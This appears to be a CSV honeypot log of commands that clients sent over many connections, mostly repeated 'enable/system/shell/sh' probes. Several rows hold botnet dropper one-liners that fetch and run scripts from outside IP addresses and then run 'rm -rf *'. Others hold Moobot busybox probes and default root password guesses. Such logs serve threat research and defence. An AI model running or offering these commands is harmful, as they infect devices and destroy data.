id,command,connection_id
29542,system,335317
29543,shell,335317
29544,sh,335317
29545,enable,335324
29546,system,335324
29547,shell,335324
29548,sh,335324
29549,enable,335325
29550,system,335325
29551,shell,335325
29552,sh,335325
29553,enable,335326
29554,system,335326
29555,shell,335326
29556,sh,335326
29557,enable,335581
29558,system,335581
29559,shell,335581
29560,sh,335581
29561,enable,335582
29562,system,335582
29563,shell,335582
29564,sh,335582
29565,enable,335585
29566,system,335585
29567,shell,335585
29568,sh,335585
29569,enable,335661
29570,system,335661
29571,shell,335661
29572,sh,335661
29573,enable,335663
29574,system,335663
29575,shell,335663
29576,sh,335663
29577,"cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget http://94.242.55.143/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 94.242.55.143 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 94.242.55.143; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 94.242.55.143 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *",335676
29578,enable,335680
29579,system,335680
29580,shell,335680
29581,sh,335680
29582,"cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget http://94.242.55.143/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 94.242.55.143 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 94.242.55.143; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 94.242.55.143 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *",335689
29583,"/bin/busybox MOOBOT",335699
29584,enable,335711
29585,system,335711
29586,shell,335711
29587,sh,335711
29588,enable,335715
29589,system,335715
29590,shell,335715
29591,sh,335715
29592,enable,335795
29593,system,335795
29594,shell,335795
29595,sh,335795
29596,enable,335810
29597,system,335810
29598,shell,335810
29599,sh,335810
29600,enable,335863
29601,system,335863
29602,shell,335863
29603,sh,335863
29604,enable,335870
29605,system,335870
29606,shell,335870
29607,sh,335870
29608,enable,335894
29609,system,335894
29610,shell,335894
29611,sh,335894
29612,enable,335895
29613,system,335895
29614,shell,335895
29615,sh,335895
29616,enable,335917
29617,system,335917
29618,shell,335917
29619,sh,335917
29620,enable,335925
29621,system,335925
29622,shell,335925
29623,sh,335925
29624,enable,335927
29625,system,335927
29626,shell,335927
29627,sh,335927
29628,enable,335928
29629,system,335928
29630,shell,335928
29631,sh,335928
29632,enable,336060
29633,system,336060
29634,shell,336060
29635,sh,336060
29636,enable,336077
29637,system,336077
29638,shell,336077
29639,sh,336077
29640,enable,336116
29641,system,336116
29642,shell,336116
29643,sh,336116
29644,enable,336132
29645,system,336132
29646,shell,336132
29647,sh,336132
29648,enable,336133
29649,system,336133
29650,shell,336133
29651,sh,336133
29652,enable,336164
29653,system,336164
29654,shell,336164
29655,sh,336164
29656,enable,336233
29657,system,336233
29658,shell,336233
29659,sh,336233
29660,enable,336235
29661,system,336235
29662,shell,336235
29663,sh,336235
29664,enable,336238
29665,system,336238
29666,shell,336238
29667,sh,336238
29668,enable,336339
29669,system,336339
29670,shell,336339
29671,sh,336339
29672,enable,336345
29673,system,336345
29674,shell,336345
29675,sh,336345
29676,enable,336446
29677,system,336446
29678,shell,336446
29679,sh,336446
29680,enable,336448
29681,system,336448
29682,shell,336448
29683,sh,336448
29684,enable,336567
29685,system,336567
29686,shell,336567
29687,sh,336567
29688,enable,336614
29689,system,336614
29690,shell,336614
29691,sh,336614
29692,enable,336619
29693,system,336619
29694,shell,336619
29695,sh,336619
29696,enable,336640
29697,system,336640
29698,shell,336640
29699,sh,336640
29700,enable,336656
29701,system,336656
29702,shell,336656
29703,sh,336656
29704,enable,336697
29705,system,336697
29706,shell,336697
29707,sh,336697
29708,enable,336709
29709,system,336709
29710,shell,336709
29711,sh,336709
29712,enable,336720
29713,system,336720
29714,shell,336720
29715,sh,336720
29716,enable,336722
29717,system,336722
29718,shell,336722
29719,sh,336722
29720,enable,336743
29721,system,336743
29722,shell,336743
29723,sh,336743
29724,enable,336780
29725,system,336780
29726,shell,336780
29727,sh,336780
29728,enable,336782
29729,system,336782
29730,shell,336782
29731,sh,336782
29732,enable,336789
29733,system,336789
29734,shell,336789
29735,sh,336789
29736,enable,336854
29737,system,336854
29738,shell,336854
29739,sh,336854
29740,enable,336855
29741,system,336855
29742,shell,336855
29743,sh,336855
29744,enable,336884
29745,system,336884
29746,shell,336884
29747,sh,336884
29748,enable,336972
29749,system,336972
29750,shell,336972
29751,sh,336972
29752,enable,336988
29753,system,336988
29754,shell,336988
29755,sh,336988
29756,"/bin/busybox MOOBOT",336994
29757,enable,337008
29758,system,337008
29759,shell,337008
29760,sh,337008
29761,enable,337112
29762,system,337112
29763,shell,337112
29764,sh,337112
29765,enable,337115
29766,system,337115
29767,shell,337115
29768,sh,337115
29769,enable,337135
29770,system,337135
29771,shell,337135
29772,sh,337135
29773,enable,337143
29774,system,337143
29775,shell,337143
29776,sh,337143
29777,"/bin/busybox MOOBOT",337177
29778,enable,337178
29779,system,337178
29780,shell,337178
29781,sh,337178
29782,enable,337197
29783,system,337197
29784,shell,337197
29785,sh,337197
29786,enable,337208
29787,system,337208
29788,shell,337208
29789,sh,337208
29790,enable,337226
29791,system,337226
29792,shell,337226
29793,sh,337226
29794,enable,337271
29795,system,337271
29796,shell,337271
29797,sh,337271
29798,enable,337317
29799,system,337317
29800,shell,337317
29801,sh,337317
29802,enable,337335
29803,system,337335
29804,shell,337335
29805,sh,337335
29806,enable,337359
29807,enable,337358
29808,system,337359
29809,system,337358
29810,shell,337359
29811,shell,337358
29812,sh,337359
29813,sh,337358
29814,enable,337366
29815,system,337366
29816,shell,337366
29817,sh,337366
29818,enable,337426
29819,system,337426
29820,shell,337426
29821,sh,337426
29822,enable,337428
29823,enable,337429
29824,system,337428
29825,system,337429
29826,shell,337428
29827,shell,337429
29828,sh,337428
29829,sh,337429
29830,enable,337430
29831,system,337430
29832,shell,337430
29833,sh,337430
29834,enable,337434
29835,system,337434
29836,shell,337434
29837,sh,337434
29838,enable,337437
29839,system,337437
29840,shell,337437
29841,sh,337437
29842,enable,337557
29843,system,337557
29844,shell,337557
29845,sh,337557
29846,enable,337587
29847,system,337587
29848,shell,337587
29849,sh,337587
29850,enable,337588
29851,system,337588
29852,shell,337588
29853,sh,337588
29854,enable,337604
29855,system,337604
29856,shell,337604
29857,sh,337604
29858,enable,337656
29859,system,337656
29860,shell,337656
29861,sh,337656
29862,enable,337657
29863,system,337657
29864,shell,337657
29865,sh,337657
29866,enable,337855
29867,system,337855
29868,shell,337855
29869,sh,337855
29870,"Accept: */*",337867
29871,"Content-Type: application/json",337867
29872,enable,337895
29873,system,337895
29874,shell,337895
29875,sh,337895
29876,enable,337904
29877,system,337904
29878,shell,337904
29879,sh,337904
29880,enable,337906
29881,system,337906
29882,shell,337906
29883,sh,337906
29884,enable,337941
29885,system,337941
29886,shell,337941
29887,sh,337941
29888,enable,337966
29889,system,337966
29890,shell,337966
29891,sh,337966
29892,enable,338002
29893,system,338002
29894,shell,338002
29895,sh,338002
29896,enable,338009
29897,system,338009
29898,shell,338009
29899,sh,338009
29900,enable,338013
29901,system,338013
29902,shell,338013
29903,sh,338013
29904,enable,338448
29905,system,338448
29906,shell,338448
29907,sh,338448
29908,enable,338452
29909,system,338452
29910,shell,338452
29911,sh,338452
29912,enable,338478
29913,system,338478
29914,shell,338478
29915,sh,338478
29916,enable,338511
29917,system,338511
29918,shell,338511
29919,sh,338511
29920,enable,338542
29921,system,338542
29922,shell,338542
29923,sh,338542
29924,enable,338544
29925,system,338544
29926,shell,338544
29927,sh,338544
29928,enable,338545
29929,system,338545
29930,shell,338545
29931,sh,338545
29932,enable,338550
29933,system,338550
29934,shell,338550
29935,sh,338550
29936,enable,338564
29937,system,338564
29938,shell,338564
29939,sh,338564
29940,enable,338842
29941,system,338842
29942,shell,338842
29943,sh,338842
29944,enable,342525
29945,system,342525
29946,shell,342525
29947,sh,342525
29948,enable,342527
29949,system,342527
29950,shell,342527
29951,sh,342527
29952,enable,343000
29953,system,343000
29954,shell,343000
29955,sh,343000
29956,enable,343005
29957,system,343005
29958,shell,343005
29959,sh,343005
29960,enable,343075
29961,system,343075
29962,shell,343075
29963,sh,343075
29964,enable,343145
29965,system,343145
29966,shell,343145
29967,sh,343145
29968,enable,343148
29969,system,343148
29970,shell,343148
29971,sh,343148
29972,enable,343161
29973,system,343161
29974,shell,343161
29975,sh,343161
29976,enable,343164
29977,system,343164
29978,shell,343164
29979,sh,343164
29980,enable,343171
29981,system,343171
29982,shell,343171
29983,sh,343171
29984,enable,343173
29985,system,343173
29986,shell,343173
29987,sh,343173
29988,enable,343239
29989,system,343239
29990,shell,343239
29991,sh,343239
29992,enable,343252
29993,system,343252
29994,shell,343252
29995,sh,343252
29996,enable,343271
29997,enable,343272
29998,system,343271
29999,system,343272
30000,shell,343271
30001,shell,343272
30002,sh,343271
30003,sh,343272
30004,enable,343328
30005,system,343328
30006,shell,343328
30007,sh,343328
30008,enable,343337
30009,system,343337
30010,shell,343337
30011,sh,343337
30012,enable,343359
30013,system,343359
30014,shell,343359
30015,sh,343359
30016,enable,343376
30017,system,343376
30018,shell,343376
30019,sh,343376
30020,enable,343380
30021,system,343380
30022,shell,343380
30023,sh,343380
30024,enable,343419
30025,system,343419
30026,shell,343419
30027,sh,343419
30028,enable,343467
30029,system,343467
30030,shell,343467
30031,sh,343467
30032,enable,343488
30033,system,343488
30034,shell,343488
30035,sh,343488
30036,enable,343548
30037,system,343548
30038,shell,343548
30039,sh,343548
30040,enable,343573
30041,system,343573
30042,shell,343573
30043,sh,343573
30044,enable,343584
30045,system,343584
30046,shell,343584
30047,sh,343584
30048,enable,343585
30049,system,343585
30050,shell,343585
30051,sh,343585
30052,enable,343588
30053,system,343588
30054,shell,343588
30055,sh,343588
30056,enable,343621
30057,system,343621
30058,shell,343621
30059,sh,343621
30060,enable,343624
30061,system,343624
30062,shell,343624
30063,sh,343624
30064,enable,343630
30065,system,343630
30066,shell,343630
30067,sh,343630
30068,enable,343643
30069,system,343643
30070,shell,343643
30071,sh,343643
30072,enable,343768
30073,system,343768
30074,shell,343768
30075,sh,343768
30076,enable,343771
30077,system,343771
30078,shell,343771
30079,sh,343771
30080,enable,343836
30081,system,343836
30082,shell,343836
30083,sh,343836
30084,enable,344071
30085,system,344071
30086,shell,344071
30087,sh,344071
30088,enable,344072
30089,system,344072
30090,shell,344072
30091,sh,344072
30092,enable,344123
30093,system,344123
30094,shell,344123
30095,sh,344123
30096,enable,344128
30097,system,344128
30098,shell,344128
30099,sh,344128
30100,enable,344129
30101,system,344129
30102,shell,344129
30103,sh,344129
30104,enable,344209
30105,system,344209
30106,shell,344209
30107,sh,344209
30108,enable,344235
30109,system,344235
30110,shell,344235
30111,sh,344235
30112,enable,344242
30113,system,344242
30114,shell,344242
30115,sh,344242
30116,enable,344277
30117,system,344277
30118,shell,344277
30119,sh,344277
30120,enable,344279
30121,system,344279
30122,shell,344279
30123,sh,344279
30124,enable,344280
30125,system,344280
30126,shell,344280
30127,sh,344280
30128,enable,344470
30129,system,344470
30130,shell,344470
30131,sh,344470
30132,enable,344476
30133,system,344476
30134,shell,344476
30135,sh,344476
30136,enable,344753
30137,system,344753
30138,shell,344753
30139,sh,344753
30140,enable,344872
30141,system,344872
30142,shell,344872
30143,sh,344872
30144,enable,344912
30145,system,344912
30146,shell,344912
30147,sh,344912
30148,enable,344914
30149,system,344914
30150,shell,344914
30151,sh,344914
30152,enable,344915
30153,system,344915
30154,shell,344915
30155,sh,344915
30156,enable,345116
30157,system,345116
30158,shell,345116
30159,sh,345116
30160,enable,345122
30161,system,345122
30162,shell,345122
30163,sh,345122
30164,enable,345177
30165,system,345177
30166,shell,345177
30167,sh,345177
30168,enable,345331
30169,system,345331
30170,shell,345331
30171,sh,345331
30172,enable,345391
30173,system,345391
30174,shell,345391
30175,sh,345391
30176,enable,345486
30177,system,345486
30178,shell,345486
30179,sh,345486
30180,enable,345498
30181,system,345498
30182,shell,345498
30183,sh,345498
30184,enable,345500
30185,system,345500
30186,shell,345500
30187,sh,345500
30188,enable,345555
30189,system,345555
30190,shell,345555
30191,sh,345555
30192,enable,345589
30193,system,345589
30194,shell,345589
30195,sh,345589
30196,enable,345622
30197,system,345622
30198,shell,345622
30199,sh,345622
30200,enable,345771
30201,system,345771
30202,shell,345771
30203,sh,345771
30204,enable,345790
30205,system,345790
30206,shell,345790
30207,sh,345790
30208,enable,345851
30209,system,345851
30210,shell,345851
30211,sh,345851
30212,enable,345858
30213,system,345858
30214,shell,345858
30215,sh,345858
30216,enable,345901
30217,system,345901
30218,shell,345901
30219,sh,345901
30220,enable,345902
30221,system,345902
30222,shell,345902
30223,sh,345902
30224,enable,345905
30225,system,345905
30226,shell,345905
30227,sh,345905
30228,enable,345941
30229,system,345941
30230,shell,345941
30231,sh,345941
30232,enable,345942
30233,system,345942
30234,shell,345942
30235,sh,345942
30236,enable,345943
30237,system,345943
30238,shell,345943
30239,sh,345943
30240,enable,346004
30241,system,346004
30242,shell,346004
30243,sh,346004
30244,enable,346042
30245,system,346042
30246,shell,346042
30247,sh,346042
30248,enable,346053
30249,system,346053
30250,shell,346053
30251,sh,346053
30252,enable,346054
30253,system,346054
30254,shell,346054
30255,sh,346054
30256,enable,346074
30257,system,346074
30258,shell,346074
30259,sh,346074
30260,enable,346077
30261,system,346077
30262,shell,346077
30263,sh,346077
30264,enable,346143
30265,system,346143
30266,shell,346143
30267,sh,346143
30268,enable,346144
30269,system,346144
30270,shell,346144
30271,sh,346144
30272,enable,346145
30273,system,346145
30274,shell,346145
30275,sh,346145
30276,enable,346262
30277,system,346262
30278,shell,346262
30279,sh,346262
30280,enable,346263
30281,system,346263
30282,shell,346263
30283,sh,346263
30284,enable,346265
30285,system,346265
30286,shell,346265
30287,sh,346265
30288,enable,346266
30289,system,346266
30290,shell,346266
30291,sh,346266
30292,enable,346396
30293,system,346396
30294,shell,346396
30295,sh,346396
30296,enable,346506
30297,system,346506
30298,shell,346506
30299,sh,346506
30300,enable,346547
30301,system,346547
30302,shell,346547
30303,sh,346547
30304,enable,346586
30305,system,346586
30306,shell,346586
30307,sh,346586
30308,enable,346587
30309,system,346587
30310,shell,346587
30311,sh,346587
30312,enable,346601
30313,system,346601
30314,shell,346601
30315,sh,346601
30316,enable,346602
30317,system,346602
30318,shell,346602
30319,sh,346602
30320,enable,346603
30321,system,346603
30322,shell,346603
30323,sh,346603
30324,enable,346636
30325,system,346636
30326,shell,346636
30327,sh,346636
30328,enable,346655
30329,system,346655
30330,shell,346655
30331,sh,346655
30332,enable,346660
30333,system,346660
30334,shell,346660
30335,sh,346660
30336,enable,346693
30337,system,346693
30338,shell,346693
30339,sh,346693
30340,enable,346699
30341,system,346699
30342,shell,346699
30343,sh,346699
30344,enable,346703
30345,system,346703
30346,shell,346703
30347,sh,346703
30348,enable,346965
30349,system,346965
30350,shell,346965
30351,sh,346965
30352,enable,346980
30353,system,346980
30354,shell,346980
30355,sh,346980
30356,enable,347069
30357,system,347069
30358,shell,347069
30359,sh,347069
30360,enable,347084
30361,system,347084
30362,shell,347084
30363,sh,347084
30364,enable,347160
30365,system,347160
30366,shell,347160
30367,sh,347160
30368,enable,347165
30369,system,347165
30370,shell,347165
30371,sh,347165
30372,enable,347199
30373,system,347199
30374,shell,347199
30375,sh,347199
30376,enable,347202
30377,system,347202
30378,shell,347202
30379,sh,347202
30380,enable,347306
30381,enable,347307
30382,system,347306
30383,system,347307
30384,shell,347306
30385,shell,347307
30386,sh,347306
30387,sh,347307
30388,enable,347308
30389,system,347308
30390,shell,347308
30391,sh,347308
30392,enable,347408
30393,system,347408
30394,shell,347408
30395,sh,347408
30396,enable,347460
30397,system,347460
30398,shell,347460
30399,sh,347460
30400,enable,347675
30401,system,347675
30402,shell,347675
30403,sh,347675
30404,enable,347925
30405,system,347925
30406,shell,347925
30407,sh,347925
30408,enable,347961
30409,system,347961
30410,shell,347961
30411,sh,347961
30412,enable,347981
30413,system,347981
30414,shell,347981
30415,sh,347981
30416,enable,348365
30417,system,348365
30418,shell,348365
30419,sh,348365
30420,enable,348621
30421,system,348621
30422,shell,348621
30423,sh,348621
30424,enable,348664
30425,system,348664
30426,shell,348664
30427,sh,348664
30428,enable,348665
30429,system,348665
30430,shell,348665
30431,sh,348665
30432,enable,348777
30433,system,348777
30434,shell,348777
30435,sh,348777
30436,enable,348870
30437,system,348870
30438,shell,348870
30439,sh,348870
30440,enable,348874
30441,system,348874
30442,shell,348874
30443,sh,348874
30444,enable,348876
30445,system,348876
30446,shell,348876
30447,sh,348876
30448,enable,348877
30449,system,348877
30450,shell,348877
30451,sh,348877
30452,enable,348883
30453,system,348883
30454,shell,348883
30455,sh,348883
30456,enable,348909
30457,system,348909
30458,shell,348909
30459,sh,348909
30460,enable,348965
30461,system,348965
30462,shell,348965
30463,sh,348965
30464,enable,348972
30465,system,348972
30466,shell,348972
30467,sh,348972
30468,enable,348973
30469,system,348973
30470,shell,348973
30471,sh,348973
30472,enable,349053
30473,system,349053
30474,shell,349053
30475,sh,349053
30476,enable,349073
30477,system,349073
30478,shell,349073
30479,sh,349073
30480,enable,349076
30481,system,349076
30482,shell,349076
30483,sh,349076
30484,enable,349273
30485,system,349273
30486,shell,349273
30487,sh,349273
30488,enable,349477
30489,system,349477
30490,shell,349477
30491,sh,349477
30492,enable,349540
30493,system,349540
30494,shell,349540
30495,sh,349540
30496,enable,349546
30497,system,349546
30498,shell,349546
30499,sh,349546
30500,enable,349591
30501,system,349591
30502,shell,349591
30503,sh,349591
30504,enable,349606
30505,system,349606
30506,shell,349606
30507,sh,349606
30508,enable,349677
30509,system,349677
30510,shell,349677
30511,sh,349677
30512,enable,349850
30513,system,349850
30514,shell,349850
30515,sh,349850
30516,enable,349971
30517,system,349971
30518,shell,349971
30519,sh,349971
30520,enable,350050
30521,system,350050
30522,shell,350050
30523,sh,350050
30524,enable,350250
30525,system,350250
30526,shell,350250
30527,sh,350250
30528,enable,350252
30529,system,350252
30530,shell,350252
30531,sh,350252
30532,enable,350253
30533,system,350253
30534,shell,350253
30535,sh,350253
30536,enable,350285
30537,system,350285
30538,shell,350285
30539,sh,350285
30540,enable,350367
30541,system,350367
30542,shell,350367
30543,sh,350367
30544,enable,350502
30545,system,350502
30546,shell,350502
30547,sh,350502
30548,enable,350519
30549,system,350519
30550,shell,350519
30551,sh,350519
30552,enable,350528
30553,system,350528
30554,shell,350528
30555,sh,350528
30556,enable,350533
30557,system,350533
30558,shell,350533
30559,sh,350533
30560,enable,350619
30561,system,350619
30562,shell,350619
30563,sh,350619
30564,enable,350728
30565,system,350728
30566,shell,350728
30567,sh,350728
30568,enable,350731
30569,system,350731
30570,shell,350731
30571,sh,350731
30572,enable,350905
30573,system,350905
30574,shell,350905
30575,sh,350905
30576,enable,351227
30577,system,351227
30578,shell,351227
30579,sh,351227
30580,enable,351339
30581,system,351339
30582,shell,351339
30583,sh,351339
30584,enable,351360
30585,system,351360
30586,shell,351360
30587,sh,351360
30588,enable,351551
30589,system,351551
30590,shell,351551
30591,sh,351551
30592,"User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36",351676
30593,"Accept: */*",351676
30594,enable,351684
30595,system,351684
30596,shell,351684
30597,sh,351684
30598,enable,351737
30599,system,351737
30600,shell,351737
30601,sh,351737
30602,enable,351783
30603,system,351783
30604,shell,351783
30605,sh,351783
30606,"User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",351883
30607,"Accept-Encoding: gzip, deflate, br",351883
30608,"Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",351883
30609,"Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3",351883
30610,"%-12345X@PJL INFO ID",351885
30611,"%-12345X",351885
30612,enable,351968
30613,system,351968
30614,shell,351968
30615,sh,351968
30616,enable,351978
30617,system,351978
30618,shell,351978
30619,sh,351978
30620,sh,352176
30621,shell,352176
30622,"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.17.41.217/8UsA.sh; curl -O http://46.17.41.217/8UsA.sh; chmod 777 8UsA.sh; sh 8UsA.sh; tftp 46.17.41.217 -c get t8UsA.sh; chmod 777 t8UsA.sh; sh t8UsA.sh; tftp -r t8UsA2.sh -g 46.17.41.217; chmod 777 t8UsA2.sh; sh t8UsA2.sh; ftpget -v -u anonymous -p anonymous -P 21 46.17.41.217 8UsA1.sh 8UsA1.sh; sh 8UsA1.sh; rm -rf 8UsA.sh t8UsA.sh t8UsA2.sh 8UsA1.sh; rm -rf *",352176
30623,sh,352176
30624,enable,352204
30625,system,352204
30626,shell,352204
30627,sh,352204
30628,enable,352294
30629,system,352294
30630,shell,352294
30631,sh,352294
30632,enable,352305
30633,enable,352306
30634,system,352305
30635,system,352306
30636,shell,352305
30637,shell,352306
30638,sh,352305
30639,sh,352306
30640,enable,352310
30641,system,352310
30642,shell,352310
30643,sh,352310
30644,enable,352345
30645,system,352345
30646,shell,352345
30647,sh,352345
30648,enable,352385
30649,system,352385
30650,shell,352385
30651,sh,352385
30652,enable,352440
30653,system,352440
30654,shell,352440
30655,sh,352440
30656,enable,352454
30657,system,352454
30658,shell,352454
30659,sh,352454
30660,enable,352520
30661,system,352520
30662,shell,352520
30663,sh,352520
30664,enable,352527
30665,system,352527
30666,shell,352527
30667,sh,352527
30668,enable,352546
30669,system,352546
30670,shell,352546
30671,sh,352546
30672,enable,352625
30673,system,352625
30674,shell,352625
30675,sh,352625
30676,enable,352684
30677,system,352684
30678,shell,352684
30679,sh,352684
30680,enable,352795
30681,system,352795
30682,shell,352795
30683,sh,352795
30684,enable,352883
30685,system,352883
30686,shell,352883
30687,sh,352883
30688,enable,352939
30689,system,352939
30690,shell,352939
30691,sh,352939
30692,enable,353021
30693,enable,353022
30694,system,353021
30695,system,353022
30696,shell,353021
30697,shell,353022
30698,sh,353021
30699,sh,353022
30700,enable,353091
30701,system,353091
30702,shell,353091
30703,sh,353091
30704,enable,353121
30705,system,353121
30706,shell,353121
30707,sh,353121
30708,enable,353130
30709,system,353130
30710,shell,353130
30711,sh,353130
30712,enable,353159
30713,system,353159
30714,shell,353159
30715,sh,353159
30716,enable,353389
30717,system,353389
30718,shell,353389
30719,sh,353389
30720,enable,353429
30721,system,353429
30722,shell,353429
30723,sh,353429
30724,enable,353442
30725,system,353442
30726,shell,353442
30727,sh,353442
30728,enable,353521
30729,system,353521
30730,shell,353521
30731,sh,353521
30732,enable,353522
30733,system,353522
30734,shell,353522
30735,sh,353522
30736,enable,353523
30737,system,353523
30738,shell,353523
30739,sh,353523
30740,enable,353681
30741,system,353681
30742,shell,353681
30743,sh,353681
30744,enable,353686
30745,system,353686
30746,shell,353686
30747,sh,353686
30748,enable,353728
30749,system,353728
30750,shell,353728
30751,sh,353728
30752,enable,353731
30753,system,353731
30754,shell,353731
30755,sh,353731
30756,enable,353923
30757,system,353923
30758,shell,353923
30759,sh,353923
30760,enable,353963
30761,system,353963
30762,shell,353963
30763,sh,353963
30764,enable,354025
30765,system,354025
30766,shell,354025
30767,sh,354025
30768,enable,354047
30769,system,354047
30770,shell,354047
30771,sh,354047
30772,enable,354048
30773,system,354048
30774,shell,354048
30775,sh,354048
30776,enable,354068
30777,system,354068
30778,shell,354068
30779,sh,354068
30780,enable,354085
30781,system,354085
30782,shell,354085
30783,sh,354085
30784,enable,354089
30785,system,354089
30786,shell,354089
30787,sh,354089
30788,enable,354116
30789,system,354116
30790,shell,354116
30791,sh,354116
30792,enable,354144
30793,system,354144
30794,shell,354144
30795,sh,354144
30796,enable,354180
30797,system,354180
30798,shell,354180
30799,sh,354180
30800,enable,354221
30801,system,354221
30802,shell,354221
30803,sh,354221
30804,enable,354247
30805,system,354247
30806,shell,354247
30807,sh,354247
30808,enable,354258
30809,system,354258
30810,shell,354258
30811,sh,354258
30812,enable,354295
30813,system,354295
30814,shell,354295
30815,sh,354295
30816,enable,354302
30817,system,354302
30818,shell,354302
30819,sh,354302
30820,enable,354318
30821,system,354318
30822,shell,354318
30823,sh,354318
30824,enable,354325
30825,system,354325
30826,shell,354325
30827,sh,354325
30828,enable,354339
30829,system,354339
30830,shell,354339
30831,sh,354339
30832,enable,354343
30833,system,354343
30834,shell,354343
30835,sh,354343
30836,enable,354349
30837,system,354349
30838,shell,354349
30839,sh,354349
30840,enable,354350
30841,system,354350
30842,shell,354350
30843,sh,354350
30844,enable,354351
30845,system,354351
30846,shell,354351
30847,sh,354351
30848,enable,354461
30849,system,354461
30850,shell,354461
30851,sh,354461
30852,enable,354463
30853,system,354463
30854,shell,354463
30855,sh,354463
30856,enable,354474
30857,system,354474
30858,shell,354474
30859,sh,354474
30860,enable,354476
30861,system,354476
30862,shell,354476
30863,sh,354476
30864,enable,354479
30865,system,354479
30866,shell,354479
30867,sh,354479
30868,enable,354600
30869,system,354600
30870,shell,354600
30871,sh,354600
30872,enable,354614
30873,system,354614
30874,shell,354614
30875,sh,354614
30876,enable,354622
30877,system,354622
30878,shell,354622
30879,sh,354622
30880,enable,354649
30881,system,354649
30882,shell,354649
30883,sh,354649
30884,enable,354771
30885,system,354771
30886,shell,354771
30887,sh,354771
30888,enable,354813
30889,system,354813
30890,shell,354813
30891,sh,354813
30892,enable,354879
30893,system,354879
30894,shell,354879
30895,sh,354879
30896,enable,354939
30897,system,354939
30898,shell,354939
30899,sh,354939
30900,enable,354946
30901,system,354946
30902,shell,354946
30903,sh,354946
30904,enable,354986
30905,system,354986
30906,shell,354986
30907,sh,354986
30908,enable,355026
30909,system,355026
30910,shell,355026
30911,sh,355026
30912,enable,355034
30913,system,355034
30914,shell,355034
30915,sh,355034
30916,enable,355084
30917,system,355084
30918,shell,355084
30919,sh,355084
30920,"User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",355219
30921,"%-12345X@PJL INFO ID",355220
30922,fox.version=s:1.0,355231
30923,enable,355364
30924,system,355364
30925,shell,355364
30926,sh,355364
30927,enable,355379
30928,system,355379
30929,shell,355379
30930,sh,355379
30931,enable,355380
30932,system,355380
30933,shell,355380
30934,sh,355380
30935,enable,355427
30936,system,355427
30937,shell,355427
30938,sh,355427
30939,root,355431
30940,123456,355431
30941,root,355431
30942,zsun1188,355431
30943,enable,355432
30944,system,355432
30945,shell,355432
30946,sh,355432
30947,enable,355446
30948,system,355446
30949,shell,355446
30950,sh,355446
30951,enable,355459
30952,system,355459
30953,shell,355459
30954,sh,355459
30955,enable,355503
30956,system,355503
30957,shell,355503
30958,sh,355503
30959,enable,355548
30960,system,355548
30961,shell,355548
30962,sh,355548
30963,enable,355904
30964,system,355904
30965,shell,355904
30966,sh,355904
30967,enable,355924
30968,system,355924
30969,shell,355924
30970,sh,355924
30971,enable,356026
30972,system,356026
30973,shell,356026
30974,sh,356026
30975,enable,356108
30976,system,356108
30977,shell,356108
30978,sh,356108
30979,sh,356110
30980,shell,356110
